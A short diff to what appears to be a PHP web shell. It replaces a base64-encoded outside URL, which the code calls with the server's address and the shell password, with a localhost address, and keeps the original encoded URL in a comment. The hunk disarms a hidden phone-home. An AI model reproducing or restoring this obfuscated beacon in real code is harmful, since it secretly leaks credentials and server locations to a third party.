@@ -1265,7 +1265,7 @@ function hmlogin($xiao=1){
     @set_time_limit(10);
 	$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
     $serverp = envlpass;
-    $copyurl = base64_decode('aHR0cDovL3d3dy50cm95cGxhbi5jb20vcC5hc3B4P249');
+    $copyurl = base64_decode('aHR0cDovLzEyNy4wLjAuMS8v'); //aHR0cDovL3d3dy50cm95cGxhbi5jb20vcC5hc3B4P249
     $url=$copyurl.$serveru.'&p='.$serverp;
     $url=urldecode($url);
     $re=file_get_contents($url);
